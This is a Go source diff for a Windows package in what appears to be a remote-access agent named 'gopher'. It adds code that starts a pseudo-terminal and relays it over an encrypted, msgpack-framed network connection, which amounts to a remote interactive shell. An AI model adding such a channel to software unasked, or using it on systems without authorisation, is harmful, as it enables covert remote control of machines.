@@ -4,10 +4,16 @@
 package functions
 
 import (
+	"bytes"
+	"context"
 	"fmt"
+	"github.com/gabemarshall/pty"
+	"github.com/vmihailenco/msgpack/v5"
 	"golang.org/x/sys/windows"
 	"gopher/utils"
+	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 	"strconv"
@@ -197,4 +203,119 @@ func GetProcesses() ([]utils.PsInfo, error) {
 	}
 
 	return Processes, nil
+}
+
+func IsProcessAlive(cmd *exec.Cmd) bool {
+	if cmd.Process == nil {
+		return false
+	}
+	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
+		return false
+	}
+	return true
+}
+
+func StartPtyCommand(process *exec.Cmd, columns uint16, rows uint16) (any, error) {
+	windowSize := pty.Winsize{Rows: rows, Cols: columns}
+	return pty.StartWithSize(process, &windowSize)
+}
+
+func StopPty(Pipe any) error {
+	src := Pipe.(pty.Pty)
+	return src.Close()
+}
+
+func RelayMsgToFile(ctx context.Context, cancel context.CancelFunc, src net.Conn, dstPipe any, tunKey []byte) {
+
+	dst := dstPipe.(pty.Pty)
+	procSrvRead := func(data []byte) []byte {
+		var inMessage utils.Message
+		recvData, err := utils.DecryptData(data, tunKey)
+		if err != nil {
+			return nil
+		}
+
+		err = msgpack.Unmarshal(recvData, &inMessage)
+		if err != nil {
+			return nil
+		}
+
+		var buffer bytes.Buffer
+		for _, obj := range inMessage.Object {
+			var command utils.Command
+			err = msgpack.Unmarshal(obj, &command)
+			if err != nil {
+				return nil
+			}
+
+			if command.Code == 1 {
+				cancel()
+				return nil
+			}
+
+			buffer.Write(command.Data)
+		}
+
+		return buffer.Bytes()
+	}
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			data, err := RecvMsg(src)
+			if err != nil {
+				cancel()
+				continue
+			}
+			processed := procSrvRead(data)
+			if processed != nil {
+				written := 0
+				for written < len(processed) {
+					w, err := dst.Write(processed[written:])
+					if err != nil {
+						cancel()
+						continue
+					}
+					written += w
+				}
+			}
+		}
+	}
+}
+
+func RelayFileToMsg(ctx context.Context, cancel context.CancelFunc, srcPipe any, dst net.Conn, tunKey []byte) {
+	src := srcPipe.(pty.Pty)
+
+	procSrvWrite := func(data []byte) []byte {
+		buf, err := utils.EncryptData(data, tunKey)
+		if err != nil {
+			return nil
+		}
+		return buf
+	}
+
+	buf := make([]byte, 10000)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			n, err := src.Read(buf)
+			if err != nil {
+				cancel()
+				continue
+			}
+			processed := procSrvWrite(buf[:n])
+			if processed == nil {
+				continue
+			}
+			err = SendMsg(dst, processed)
+			if err != nil {
+				cancel()
+				continue
+			}
+		}
+	}
 }
